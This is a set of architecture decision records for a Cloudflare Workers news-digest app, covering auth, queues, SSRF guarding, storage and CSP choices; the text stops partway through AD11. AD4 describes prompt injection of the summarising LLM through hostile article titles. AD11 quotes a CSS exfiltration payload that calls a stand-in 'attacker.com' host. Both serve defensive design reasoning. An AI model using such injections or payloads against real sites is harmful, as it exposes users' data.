# Architecture Decision Records

<!-- doc-allow-large: AD46 ADR index single-file design -->

Decisions made during implementation, with rationale.

**Audience:** Developers

Each ADR documents a non-obvious design choice and the trade-offs considered. Decisions cite related requirements via REQ-X-N format.

---

## Decision Index

| ID | Decision | Category | Date |
|----|----------|----------|------|
| [AD1](#ad1-custom-federated-oauthoidc-github-google-hmac-sha256-jwt) | Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT, no third-party auth library | Security | 2026-04-22 |
| [AD2](#ad2-cloudflare-queues-for-digest-generation) | Cloudflare Queues for digest generation under thundering herd | Architecture | 2026-04-22 |
| [AD3](#ad3-server-side-article-body-fetching-with-ssrf-guard) | Server-side article-body fetching with SSRF guard | Security | 2026-04-27 |
| [AD4](#ad4-plaintext-only-llm-output) | Plaintext-only LLM output; no markdown parser or HTML sanitizer | Security | 2026-04-22 |
| [AD5](#ad5-kv-for-caches-d1-for-consistent-state) | KV for caches, D1 for consistent state | Storage | 2026-04-22 |
| [AD6](#ad6-polling-for-scrape-run-progress-not-sse-or-websockets) | Polling instead of SSE or WebSockets for scrape-run progress | UI | 2026-04-22 |
| [AD7](#ad7-d1-for-chunk-completion-tracking-replacing-kv-read-modify-write) | D1 for chunk completion tracking, replacing KV read-modify-write (CF-002) | Storage | 2026-04-27 |
| [AD8](#ad8-cookie-attributes-are-the-security-contract) | Cookie attributes are the security contract - kept inline in REQ-AUTH-002/003 | Security | 2026-05-03 |
| [AD9](#ad9-storage-shape-names-are-the-persistence-contract) | Storage-shape names (D1 columns, KV keys) are the persistence contract - kept inline in REQ-DISC/AUTH/SET *(Superseded by AD47)* | Storage | 2026-05-03 |
| [AD10](#ad10-atomic-conditional-update-as-the-once-per-run-idempotency-gate) | Atomic conditional UPDATE as the once-per-run idempotency gate - no `acquireOnceLock` helper | Architecture | 2026-05-03 |
| [AD11](#ad11-keep-style-src-unsafe-inline-runtime-stylex-writes-are-intentional) | Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes for FLIP + view-transitions are intentional | Security | 2026-05-04 |
| [AD12](#ad12-integration-env-separate-cloudflare-resources-manual-trigger-from-develop-crons-disabled) | Integration env: separate Cloudflare resources, manual trigger from develop, crons disabled | Operations | 2026-05-04 |
| [AD13](#ad13-no-non-essential-cookies-analytics-gate) | No non-essential cookies (analytics gate) | Privacy | 2026-05-04 |
| [AD14](#ad14-history-page-perf-comparability-test-permanently-skipped) | History-page perf-comparability test permanently skipped | Testing | 2026-05-04 |
| [AD15](#ad15-test-pool-exercises-workerts-directly-production-runs-through-the-astro-merged-entry) | Test pool exercises worker.ts directly; production runs through Astro-merged entry | Architecture | 2026-05-04 |
| [AD16](#ad16-single-writer-invariant-for-kv-sourcestag-enforced-via-centralised-helper) | Single-writer invariant for KV `sources:{tag}` enforced via centralized helper | Storage | 2026-05-04 |
| [AD17](#ad17-reject-dedupe-groupsts-extraction) | Reject `dedupe-groups.ts` extraction; finalize within-group dedup is downstream-gated | Architecture | 2026-05-04 |
| [AD18](#ad18-reject-deferred-candidatests-chunk-overflow-path-stays-log-only) | Reject `deferred-candidates.ts`; chunk-overflow drop path stays log-only until volume justifies persistence | Architecture | 2026-05-04 |
| [AD19](#ad19-reject-tag-railing-flip-corets-flip-measurements-are-not-separable-from-dom) | Reject `tag-railing-flip-core.ts`; FLIP measurements are not separable from DOM and are tested via Playwright | Testing | 2026-05-04 |
| [AD20](#ad20-idempotency-tokens-for-client-scripts-loaded-both-as-pattern-b-iife-and-via-page-level-import-must-live-on-window) | Window-scoped idempotency token for star-delegation listener (dual-bundle Pattern B) | Architecture | 2026-05-04 |
| [AD21](#ad21-drop-cap-vertical-alignment-is-not-portable-across-non-charter-serif-fallbacks) | Drop-cap per-platform fine-tuning deferred; system font metrics are the cross-platform constraint | UI | 2026-05-04 |
| [AD22](#ad22-ssrf-defence-relies-on-workers-network-sandbox-static-ip-allowlist-is-best-effort-only) | SSRF defence relies on Workers network sandbox; static IP allowlist is best-effort only | Security | 2026-05-05 |
| [AD23](#ad23-auth-rate-limit-fail-closed-without-waf-backstop) | Auth-rate-limit fail-closed without WAF backstop | Security | 2026-05-05 |
| [AD24](#ad24-single-oauthjwtsecret-for-both-session-signing-and-csrf-state) | Single OAUTH_JWT_SECRET for both session signing and CSRF state | Security | 2026-05-05 |
| [AD25](#ad25-cloudflare-access-jwt-signature-unverified-server-side-trust-access-edge) | Cloudflare Access JWT signature unverified server-side; trust Access edge *(Superseded by AD29)* | Security | 2026-05-05 |
| [AD26](#ad26-requirementsmd-preserved-as-historical-artefact) | REQUIREMENTS.md preserved as historical artefact | Documentation | 2026-05-05 |
| [AD27](#ad27-all-kv-writers-route-through-srclibkvfamilyts-helpers) | All KV writers route through `src/lib/kv/<family>.ts` helpers | Storage | 2026-05-05 |
| [AD28](#ad28-npm-audit-gating-split---high-advisory-critical-blocking) | npm audit gating: HIGH advisory, CRITICAL blocking | Operations | 2026-05-05 |
| [AD29](#ad29-cloudflare-access-is-opt-in-additive-perimeter-adminemail-gates-admin-alone) | Cloudflare Access is opt-in additive perimeter; ADMIN_EMAIL gates admin alone | Security | 2026-05-05 |
| [AD30](#ad30-workersdev-perimeter-coverage-is-the-operators-responsibility---accepted-risk) | Cloudflare Access (when bound) MUST cover `*.workers.dev` too; not enforced in worker code | Security | 2026-05-05 |
| [AD31](#ad31-google-news-baseline-ownership-lives-at-the-coordinator-not-in-discovery) | Google News baseline ownership: coordinator owns per-tag GN fan-out; discovery LLM no longer emits GN fallback | Architecture | 2026-05-06 |
| [AD32](#ad32-same-story-dedup-uses-workers-ai-embeddings-vectorize-not-llm-finalize-call) | Same-story dedup uses Workers AI embeddings + Vectorize (replaces LLM finalize dedup) | Architecture | 2026-05-06 |
| [AD33](#ad33-embed-source-text-and-apply-a-same-vendor-cosine-penalty) | Embed source-text (not LLM rewrite) and apply a same-vendor cosine penalty for dedup | Architecture | 2026-05-06 |
| [AD34](#ad34-llm-same-event-rerank-for-borderline-cosine-pairs) | LLM same-event rerank for borderline cosine pairs (between auto-merge and distinct bands) | Architecture | 2026-05-07 |
| [AD35](#ad35-operator-historical-dedup-sweep-self-chains-via-cloudflare-queue) | Operator historical-dedup sweep self-chains via Cloudflare Queue, not the operator's browser tab | Architecture | 2026-05-07 |
| [AD36](#ad36-lower-dedup-auto-merge-threshold-to-078-and-remove-the-per-batch-rerank-cap) | Lower dedup auto-merge threshold to 0.78 and remove the per-batch rerank cap *(Superseded by AD39)* | Architecture | 2026-05-07 |
| [AD37](#ad37-full-pipeline-run-is-backend-orchestrated-browser-tab-is-display-only) | Full pipeline run is backend-orchestrated; browser tab is display-only | Architecture | 2026-05-08 |
| [AD38](#ad38-cf-access-protected-admin-endpoints-must-be-invoked-via-top-level-navigation-not-fetch) | CF Access-protected admin endpoints must be invoked via top-level navigation, not fetch() | Security | 2026-05-08 |
| [AD39](#ad39-raise-dedup-auto-merge-threshold-to-088-and-gate-merges-to-a-72h-news-cycle-window) | Raise dedup auto-merge threshold to 0.88 and gate merges to a 72h news-cycle window | Architecture | 2026-05-08 |
| [AD40](#ad40-equal-time-ulid-tie-break-high-confidence-cosine-band-topk-bump-and-per-article-diagnostic-logs) | Add equal-time ULID tie-break, high-confidence cosine band, topK bump, and per-article diagnostic logs to dedup | Architecture | 2026-05-09 |
| [AD41](#ad41-bidirectional-finalize-merge-automatic-post-tick-dedup-sweep) | Bidirectional finalize merge + automatic post-tick dedup sweep | Architecture | 2026-05-09 |
| [AD42](#ad42-bidirectional-historical-dedup-sweep-cursor-aligned-with-time-window-multi-rerank) | Bidirectional historical-dedup + sweep cursor aligned with time window + multi-rerank | Architecture | 2026-05-10 |
| [AD43](#ad43-shared-per-match-dedup-classifier-outer-control-flow-stays-per-consumer) | Shared per-match dedup classifier; outer control flow stays per-consumer | Architecture | 2026-05-12 |
| [AD44](#ad44-cloudflare-access-jwt-exp-validation-signature-still-trusted-from-the-perimeter) | Cloudflare Access JWT `exp` validation; signature still trusted from the perimeter | Security | 2026-05-12 |
| [AD45](#ad45-accepted-orchestration-file-sizes-coordinator-chunk-consumer-settingsastro) | Accepted orchestration-file sizes (coordinator, chunk-consumer, settings.astro) exceed 800-line cap | Architecture | 2026-05-11 |
| [AD46](#ad46-documentation-file-size-hatches-and-hybrid-renderings-deployment-colocation-architecture-diagrams-adr-index-deployment-hybrid-shape) | Documentation file-size hatches and hybrid renderings (deployment colocation, architecture diagrams, ADR index, deployment hybrid shape, api-reference completeness) | Documentation | 2026-05-12 |
| [AD46e](#ad46e-api-referencemd-completeness-exemption) | `api-reference.md` completeness exemption — ~90 endpoint sections cannot decompose without fragmenting the reader's lookup path | Documentation | 2026-05-13 |
| [AD47](#ad47-storage-shape-allowlist-promoted-to-spec-discipline-ad9-superseded) | Storage-shape allowlist promoted to spec-discipline; AD9 superseded | Storage | 2026-05-13 |
| [AD48](#ad48-dedup-cost-reduction-borderline-rerank-watermark-batched-rerank-call-pipeline-wide-gpt-oss-20b) | Dedup cost reduction: borderline-rerank watermark + batched rerank call + pipeline-wide gpt-oss-20b | Architecture | 2026-05-14 |

---

### AD1: Custom federated OAuth/OIDC (GitHub, Google) + HMAC-SHA256 JWT

**Status:** Accepted (2026-04-22)

**Decision:** Implement sign-in from scratch (~250 lines of TypeScript) instead of adopting Better Auth, Auth.js, or Lucia.

**Context:** Sessions need to be stateless, revocable, and tied to an OAuth/OIDC authorization-code flow. The project has no password, no 2FA, no passkeys. The implementation supports multiple providers (GitHub, Google) via a shared provider registry - each provider adds one registry entry and a `fetchProfile` adapter, with no per-provider branching in the auth routes.

**Alternatives considered:**
- Better Auth + D1 adapter - pulls in an ORM-ish abstraction; version churn risk.
- Auth.js - heavier dependency footprint; GitHub provider module adds little value here.
- Lucia - deprecated at the time of decision; would have required migration anyway.

**Rationale:** The codeflare repo has a proven pattern at this exact shape. Writing ~250 lines avoids a dependency with ~50 transitive ones, eliminates ORM coupling, and simplifies deployment. Migration to Better Auth later is a bounded one-day project if scope expands.

**Consequences:** Any new OAuth provider requires one registry entry and a `fetchProfile` adapter. Session-management bugs are owned entirely by this codebase - no upstream library to patch. Reviewers must know the custom JWT shape (`src/lib/jwt.ts`) when auditing auth flows.

**Related requirements:** [REQ-AUTH-001](../../sdd/authentication.md#req-auth-001-sign-in-with-a-federated-identity-provider), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation)

---

### AD2: Cloudflare Queues for digest generation

**Status:** Accepted (2026-04-22)

**Decision:** Use Cloudflare Queues to buffer scheduled and manual digest jobs. Cron dispatches; consumer generates.

**Context:** Target scale is 100 users. Worst realistic case: all 100 schedule the same HH:MM and generate at once. Inline cron generation at concurrency 5 × 60 s per digest = 30 minutes, which exceeds the 15-minute cron wall-time.

**Alternatives considered:**
- Inline cron with concurrency cap 20 - fits wall time (7.5 min) but risks OOM (20 × 5 MB = 100 MB of 128 MB limit) and hits Workers AI per-account concurrency limits.
- `ctx.waitUntil` on refresh only - doesn't solve the scheduled-herd problem.
- Durable Object alarms per user - more precision than needed; adds DO complexity.

**Rationale:** Queues give natural per-message isolation (each job in its own isolate, no shared memory), default 10-wide concurrency with built-in backpressure, and 3-retry semantics. Cron stays a tiny dispatcher. This is the primitive Cloudflare built exactly for this shape of problem.

**Consequences:** At-least-once delivery requires all queue consumers to be idempotent. The scrape pipeline carries explicit dedup gates (AD7, AD10) specifically because queue redelivery is normal. Changing queue bindings or retry counts requires coordinated `wrangler.toml` and consumer-code updates.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence). Original framing was for a per-user generation pipeline that was retired in the 2026-04-23 global-feed rework; the queue mechanism survived the rework intact.

---

### AD3: Server-side article-body fetching with SSRF guard

**Status:** Accepted (2026-04-27, supersedes AD3-original)

**Decision:** When a feed snippet is too thin to ground a useful summary, the chunk consumer fetches the article body directly. Each fetch is SSRF-guarded, time-bounded (8 s), and size-capped (1.5 MB); a failed fetch falls back to the snippet, never blocking a summary.

**Context:** Many RSS sources publish only the headline plus a one-sentence lede in the feed (Reuters, AP, syndicated mirrors), leaving the LLM nothing concrete to summarise. An SSRF denylist plus 8 s timeout and 1.5 MB cap reduce the fetch surface to publisher-hosted article HTML only (no private IPs, no metadata services, no oversized payloads). Fetching the article body and concatenating it into the chunk prompt produced summaries that no longer hallucinated facts not present in the headline; without the body fetch, the chunk consumer's only signal was the lede.

**Alternatives considered:**
- Keep the no-fetch posture and accept thin summaries on short-snippet feeds.
- Use a residential-IP scraping service.

**Rationale:** An SSRF denylist, 8 s timeout, and 1.5 MB size cap bring the risk to negligible. Fan-out is bounded-concurrency at 20 workers. The quality improvement on short-snippet feeds justifies the added complexity.

**Consequences:** The SSRF denylist (`src/lib/ssrf-guard.ts`) must be kept current as RFC-1918 and link-local ranges evolve. Article-body fetches add latency to chunk processing; the 8 s timeout is the ceiling. New feed sources from publishers behind aggressive anti-scraping CDNs will silently fall back to snippet-only summaries.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence) AC 8

---

### AD3-original: No server-side article-body fetching

**Status:** Superseded by AD3 on 2026-04-27

**Decision (historical):** Prohibit all server-side article-body fetching. Summaries rely entirely on the feed-provided snippet.

**Context:** Drafted 2026-04-22 to avoid SSRF risk and Cloudflare-range rate-limiting by publishers. Reversed during the global-feed rework when summary quality on short-snippet feeds proved unacceptable and the risk surface was demonstrated to be manageable with explicit denylist + timeout + size cap.

**Consequences:** Superseded. See AD3 for current behaviour and its consequences.

**Why preserved:** Documentation-discipline.md prescribes immutable original ADRs with a separate superseding ADR. This entry is the archived original; AD3 above is the current decision.

---

### AD4: Plaintext-only LLM output

**Status:** Accepted (2026-04-22)

**Decision:** The LLM prompt requires plaintext output (no markdown, no HTML); summaries are stored as JSON arrays of plaintext strings and rendered via `textContent`.

**Context:** LLMs can be prompt-injected via hostile article titles to produce markdown with `javascript:` links or `<script>` tags. A markdown parser + HTML sanitizer pipeline is a non-trivial surface to keep secure across dependency updates.

**Alternatives considered:**
- Store markdown, render client-side with `marked` + DOMPurify.
- Store markdown, render server-side with sanitize-html.

**Rationale:** Plaintext + `textContent` makes XSS impossible by construction. One less dependency, one less configuration surface, zero sanitizer updates to track. Detail paragraphs are stored as a `string[]` and rendered via `textContent`, so the same invariant holds regardless of how many paragraphs the LLM returns. The constraint survived the 2026-04-23 global-feed rework (which retired the per-user generation REQs) and now applies via REQ-PIPE-002.

**Consequences:** LLM prompts must explicitly forbid markdown and HTML in output. Any future feature that needs rich article rendering (bold headings, links) requires revisiting this decision and introducing a sanitizer. Template authors must use `set:text` (or `textContent`) - never `set:html` or `innerHTML` - when rendering article titles or summaries.

**Related requirements:** [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-output-content-contract), [REQ-READ-002](../../sdd/reading.md#req-read-002-article-detail-view-rendering)

---

### AD5: KV for caches, D1 for consistent state

**Status:** Accepted (2026-04-23)

**Decision:** KV holds discovered sources, headlines, and source-health counters. D1 holds users, digests, articles, and pending_discoveries.

**Context:** KV is eventually consistent (~60 s) and globally edge-replicated; D1 is strongly consistent but single-region. Each has a shape it's optimal for.

**Alternatives considered:**
- Put everything in D1 for strong consistency everywhere.
- Put everything in KV for speed.

**Rationale:** Caches tolerate ~60 s lag and benefit from edge reads. Pending discovery work needs transactional semantics (`SELECT ... LIMIT 3` + `DELETE`) that KV's list/scan can't provide cleanly. Using each primitive for what it's designed for keeps both simpler.

**Consequences:** KV writers are centralised through `src/lib/kv/` helpers (AD27) to keep the byte-equal invariant load-bearing. Any new strongly-consistent state (counters requiring transactions, per-user locking) must go into D1, not KV. AD7 applied this directly to chunk-completion tracking.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence)

---

### AD6: Polling for scrape-run progress, not SSE or WebSockets

**Status:** Accepted (2026-04-23)

**Decision:** While a scrape run is in progress, the client polls `GET /api/scrape-status` every 5 seconds to drive the "Update in progress" indicator and the Force Refresh progress display on `/settings`.

**Context:** Scrape runs take ~60 s end-to-end. Users mostly see finished articles on their next visit; real-time progress is a quality-of-life indicator for operators watching `/settings` after triggering a force-refresh. The per-user live-generation polling pattern from the pre-2026-04-23 design is no longer applicable - the dashboard always renders from the article pool.

**Alternatives considered:**
- Server-Sent Events streaming phase updates - no clean transport between the Queue consumer and the SSE HTTP handler without adding Durable Objects.
- WebSockets via per-user DO - works for codeflare (terminals), overkill here.

**Rationale:** Polling `GET /api/scrape-status` (one D1 SELECT + one KV get) is negligible overhead at the operator-only volume this endpoint serves. No DO complexity, no WebSocket protocol, no phase-update machinery. The UX difference is imperceptible for a one-shot status flip.

**Consequences:** The 5-second poll cadence is the resolution floor for progress visibility. If scrape runs become significantly faster (sub-10 s), the polling interval should be revisited. Clients that close the browser tab during a run will miss intermediate progress but can rehydrate via `/api/scrape-status` on next open.

**Related requirements:** [REQ-PIPE-006](../../sdd/generation.md#req-pipe-006-scrape_runs-aggregation-surfaces-stats-history-and-in-flight-progress)

---

### AD7: D1 for chunk completion tracking, replacing KV read-modify-write

**Status:** Accepted (2026-04-24)

**Decision:** Move the "last chunk done" gate from a KV decrement (`scrape_run:{id}:chunks_remaining`) to a D1 `INSERT OR IGNORE` + `SELECT COUNT(*)` pattern on a dedicated `scrape_chunk_completions` table, with a follow-up conditional `UPDATE scrape_runs SET finalize_enqueued = 1 WHERE finalize_enqueued = 0` to gate the finalize handoff.

**Context:** The original KV implementation (CF-002) used a read-modify-write decrement: each chunk consumer read the counter, decremented it, and wrote it back. Under Cloudflare Queues' at-least-once delivery, this exposed two races:

1. **Decrement race:** two concurrent last-chunk consumers read the same value before either wrote. Both saw "zero remaining", both enqueued a finalize pass, and both stamped the run as `ready`.
2. **Send-gate race:** even if the count check held, both consumers could call `SCRAPE_FINALIZE.send` before either set the KV gate.

KV's eventual consistency made both races effectively undetectable via testing in non-adversarial conditions.

**Alternatives considered:**
- Durable Object for serialized counter updates - correct, but adds a DO dependency to a pipeline that runs without one today.
- KV with Compare-And-Swap (`getWithMetadata` + `put` with `expirationTtl` as a CAS surrogate) - fragile; KV has no native CAS and the surrogate is not atomic.

**Rationale:** AD5's own principle applies directly: completion counting needs transactional semantics. `INSERT OR IGNORE` into a table keyed by `(scrape_run_id, chunk_index)` is idempotent under redelivery and gives an exact count via `SELECT COUNT(*)` - no race. The finalize-enqueue gate is collapsed into a single atomic `UPDATE … WHERE finalize_enqueued = 0`; D1 returns `meta.changes` for exactly one consumer. The KV counter (`scrape_run:{id}:chunks_remaining`) is retained as a derived mirror for the `/api/scrape-status` progress display but is no longer authoritative. Implements [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-output-content-contract) and the same-story finalize gate now in [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract) (the prior LLM-finalize-dedup REQ that owned this gate was retired in the 2026-05-13 same-story matching consolidation).

**Consequences:** The `scrape_chunk_completions` table grows one row per chunk per run; the retention cron (03:00 UTC) must cover this table or it will grow unbounded. The KV mirror is best-effort and may lag behind D1 by up to one propagation window - consumers must not rely on it for correctness, only for display.

**Related requirements:** [REQ-PIPE-001](../../sdd/generation.md#req-pipe-001-global-scrape-and-summarise-pipeline-on-a-fixed-cadence), [REQ-PIPE-002](../../sdd/generation.md#req-pipe-002-chunked-llm-output-content-contract), [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract)

---

### AD8: Cookie attributes are the security contract

**Status:** Accepted (2026-05-03)

**Overrides:** `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-AUTH-003`

**Decision:** Keep the session-cookie attributes (`__Host-` prefix, `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`) inline in REQ-AUTH-002 AC 1 and REQ-AUTH-003 AC 3. Treat them as part of the security contract, not implementation detail.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists cookie attributes as belonging in `documentation/security.md` and recommends rewriting AC bullets to user-observable consequences (e.g., "JavaScript on the page cannot read the session token"). A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against the two auth REQs.

**Alternatives considered:**
- Rewrite AC 1 to user-observable language and create `documentation/security.md` with the attribute table behind a backlink.
- Add to `sdd/.user-overrides.md` as an opaque skip entry (today's mechanism, but hides the decision from anyone reading the codebase - see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).

**Rationale:**
- The attributes are load-bearing identifiers - security reviewers grep `__Host-`, `HttpOnly`, `SameSite=Lax` directly to verify the contract holds in source, tests, and the rendered Set-Cookie header.
- Translating to user-observable language loses load-bearing detail: the AC would no longer constrain `__Host-` vs `__Secure-` prefix, SameSite policy, or Path scoping. See Consequences for the full impact.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (column name IS the contract because it's the shared identifier across UI, DB, dispatcher).

**Consequences:**
- spec-reviewer skips these two REQs via the `Overrides:` header above.
- Future cookie-policy changes update both the affected REQ AC and this ADR (and the corresponding security tests) in lockstep.
- `documentation/security.md` is not required by this decision - when it is eventually written, it backlinks here, not the other way around.

**Related requirements:** [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-AUTH-003](../../sdd/authentication.md#req-auth-003-csrf-defense-for-state-changing-endpoints)

---

### AD9: Storage-shape names are the persistence contract

**Status:** Superseded by AD47 (2026-05-13)

**Overrides:** `mechanism-leakage:REQ-DISC-001`, `mechanism-leakage:REQ-DISC-002`, `mechanism-leakage:REQ-AUTH-002`, `mechanism-leakage:REQ-AUTH-008`, `mechanism-leakage:REQ-SET-001`, `mechanism-leakage:REQ-SET-005`, `forbidden-content-column-name:REQ-MAIL-001`, `forbidden-content-column-name:REQ-MAIL-003`

**Decision:** Keep D1 column names (`session_version`, `hashtags_json`, `digest_hour`, `email_enabled`, `pending_discoveries`) and KV key shapes (`sources:{tag}`) inline in their respective REQs' acceptance criteria. Treat them as part of the persistence contract surface, not implementation detail. The same reasoning applies to `email_enabled` in REQ-MAIL-003 AC 3 and the domain header on `sdd/email.md` line 3 - the column name IS the contract noun shared between the settings UI toggle, the `users` column, and the dispatcher's SQL predicate, equivalent to the env-var-as-contract pattern allowed by `spec-discipline.md`.

**Context:** `spec-discipline.md`'s mechanism-leakage rule lists "database column names" and "internal storage shapes" as belonging in `documentation/architecture.md` schema sections. A `/sdd clean` run on 2026-05-03 escalated this as a MEDIUM JUDGMENT against five REQs across the Discovery, Authentication, and Settings domains. The cycle-4 spec-reviewer pass on 2026-05-13 surfaced REQ-AUTH-008 (the symmetric refresh-token REQ) as a sixth case fitting the same pattern (`parent_id`, `revoked_at`, `session_version`, `users.session_version` column references); it was added to the Overrides list under the same rationale. The same 2026-05-13 cycle split REQ-MAIL-001 by sub-feature into a content REQ and a send-policy REQ (REQ-MAIL-003); the `email_enabled` column reference moved with the send-policy split, so `forbidden-content-column-name:REQ-MAIL-003` was added alongside the existing MAIL-001 override.

**Alternatives considered:**
- Rewrite each AC to describe the user-visible behavior abstractly, with a doc-backlink to a schema section in `documentation/architecture.md`.
- Add per-REQ entries to `sdd/.user-overrides.md` as opaque skip rules (today's mechanism, see [codeflare#266](https://github.com/nikolanovoselec/codeflare/issues/266)).
- Split each REQ into a behavior REQ (in `sdd/`) and a schema doc (in `documentation/`) - substantial AC reshape risk.

**Rationale:**
- These names are the load-bearing identifiers shared across SQL, the Workers runtime, and future migration tooling. They are how reviewers grep to verify behavior holds; abstracting them away makes the contract harder to audit, not easier.
- Same precedent as the existing `email_enabled` exception in `sdd/.user-overrides.md` (the column name IS the contract noun shared across UI, DB, dispatcher).
- The mechanism-leakage rule targets ORM-abstracted projects. This project uses raw SQL and hand-built KV keys; storage names are the developer-facing contract, not hidden implementation detail. Same principle as the env-var-as-contract allowlist.

**Consequences:**
- spec-reviewer skips these six REQs via the `Overrides:` header above.
- Schema changes update both the affected REQ AC and this ADR (and the corresponding migration files) in lockstep.
- `documentation/architecture.md` references the storage shapes in §4.2 (libraries) and §4.5 (Worker, queue, and migrations); `documentation/configuration.md` documents the KV bindings and naming conventions. This ADR explains why those high-level references coexist with the inline persistence names in the REQs.

**Related requirements:** [REQ-DISC-001](../../sdd/discovery.md#req-disc-001-llm-assisted-per-tag-feed-discovery), [REQ-DISC-002](../../sdd/discovery.md#req-disc-002-discovery-progress-visibility), [REQ-AUTH-002](../../sdd/authentication.md#req-auth-002-access-token--refresh-token-instant-revocation), [REQ-SET-001](../../sdd/settings.md#req-set-001-unified-first-run-and-edit-flow), [REQ-SET-005](../../sdd/settings.md#req-set-005-email-notification-preference)

---

### AD10: Atomic conditional UPDATE as the once-per-run idempotency gate

**Status:** Accepted (2026-05-03)

**Decision:** Idempotency for once-per-scrape-run side effects (queue-finalize enqueue, finalize stats fold) is enforced by a single conditional `UPDATE` against a dedicated `scrape_runs` column with a `WHERE col = 0` clause. The caller inspects `meta.changes` to decide whether to proceed (`changes === 1` → won the race) or short-circuit (`changes === 0` → another isolate already won). No separate `acquireOnceLock(...)` helper is introduced.

**Context:** Two existing call sites use this shape today: (a) `scrape-chunk-consumer.ts` flips `finalize_enqueued` 0→1 to gate the `SCRAPE_FINALIZE.send` (now the same-story finalize gate in REQ-PIPE-003 AC 2); (b) `scrape-finalize-consumer.ts` flips `finalize_recorded` 0→1 inside the same UPDATE that also folds tokens + cost into the run's totals (now governed by REQ-PIPE-003 + REQ-PIPE-018; the prior LLM-finalize-dedup REQ that defined this gate was retired in the 2026-05-13 consolidation). Code-review on 2026-04-29 (CF-026) flagged the duplicated shape and proposed a generic `acquireOnceLock(db, table, id, column)` helper.

**Alternatives considered:**
- **`acquireOnceLock` helper:** fits the chunk-consumer cleanly, but breaks the finalize-consumer. See rationale for why the fused atomic UPDATE cannot be split.
- **`scrape_run_locks` keyed table** (one row per `scrape_run_id` × `lock_name`): cleaner if the number of gates grows beyond two. Today's two-site count doesn't justify the migration + new repo layer; revisit when a third gate would land.

**Rationale:**
- The pattern is two lines of SQL plus a meta.changes check. Wrapping it in a function adds an indirection the reader must follow with no ergonomics win on the call sites that exist.
- The composite UPDATE in finalize-consumer is load-bearing for atomicity. The `acquireOnceLock` helper would force a "lock then stats" split, re-introducing the failure mode PR #166's fused atomic UPDATE was designed to eliminate.
- Source-grep for `WHERE finalize_recorded = 0` and `WHERE finalize_enqueued = 0` is sufficient to find every gate site; the duplication is at the syntactic surface, not at the semantic level.

**Consequences:**
- Both gate sites stay inline. Each is documented in-place with the `meta.changes` semantics and a comment explaining why the WHERE clause carries the gate value.
- The third gate that would warrant the keyed-table refactor is treated as the trigger; this ADR is the artifact future readers find when they look for "why isn't there an `acquireOnceLock` helper?".
- New gate sites MUST copy the pattern verbatim and document the meta.changes semantics inline. When a fourth gate site lands, this ADR is reopened and the trigger refactor proposed in the Alternatives section becomes mandatory rather than deferred.

**Related requirements:** [REQ-PIPE-003](../../sdd/generation.md#req-pipe-003-same-story-dedupe-core-matching-contract), [REQ-PIPE-018](../../sdd/generation.md#req-pipe-018-same-story-collapse-mechanics-survivor-selection-and-data-merge)

---

### AD11: Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes are intentional

**Status:** Accepted (2026-04-25)

**Decision:** Retain `'unsafe-inline'` in the CSP `style-src` directive (`src/middleware/security-headers.ts`). Do not migrate FLIP animations or view-transition-name assignments away from runtime `.style.X` mutations.

**Context:** Two architectural patterns in the codebase write to inline style attributes from JavaScript at runtime:

1. **FLIP chip animations** (`src/lib/tag-railing-flip.ts`) - inline `chip.style.transform` writes on every tag-strip toggle. Values are computed per-frame from real layout measurements; they cannot be enumerated at build time.

2. **View-transition-name pre-flight** (`src/scripts/page-effects.ts`) - before an SPA navigation, the active card writes `link.style.setProperty('view-transition-name', card-${slug})` so the browser's View Transitions API can pair the source card with the destination article-detail header. The slug is per-article, not per-build.

CSP3 `style-src` enforces the same allowlist on **runtime** style-attribute writes as on inline `<style>` blocks. Removing `'unsafe-inline'` blocks both patterns.

**Alternatives considered:**

- **`'unsafe-hashes'` directive (CSP3)** - allows hash-source to validate inline event handlers and `.style.X` writes. Requires a hash for every possible value. The FLIP transforms have continuous values (`translate(${dx}px, ${dy}px)`); enumeration is impossible. Rejected.

- **CSS custom properties via `setProperty('--var', value)`** - write to `--flip-translate` against a static CSS rule. Browser enforcement of `style-src` against custom-property writes is engine-inconsistent (values stored as opaque tokens). Relies on a gray-area CSP interpretation; cross-browser fragile. Rejected.

- **Web Animations API rewrite** - CSP-exempt JS path. Requires ~3-5h refactor of `tag-railing-flip.ts` plus a view-transition-name rewrite. Security gain does not justify regression risk on animation code that is hard to validate without a real browser.

- **Dynamic `<style nonce="...">` injection** - generate a per-request nonce, inject one `<style>` per FLIP frame, append/remove. Massive overhead per animation step; complicates the FLIP loop. Rejected.

- **Migrate CSP to Astro 6 `security.csp`** - Astro 6 auto-generates hashes but runtime `.style.X` writes still wouldn't have them. Same fundamental blocker. Also blocked by the pinned `astro@5.18.1`. Rejected.

**Rationale:** The actual security cost of `'unsafe-inline'` on `style-src`, given the rest of the policy, is small:

- An XSS attacker who can inject CSS but not JS cannot run code or hijack the session - those vectors are blocked by the strict `script-src 'self'` (no inline scripts allowed).
- The classic CSS exfiltration vector - `body { background: url(http://attacker.com/log?...) }` - requires an outbound network call, which is blocked by `connect-src 'self'` and the narrow `img-src 'self' data: gravatar`.
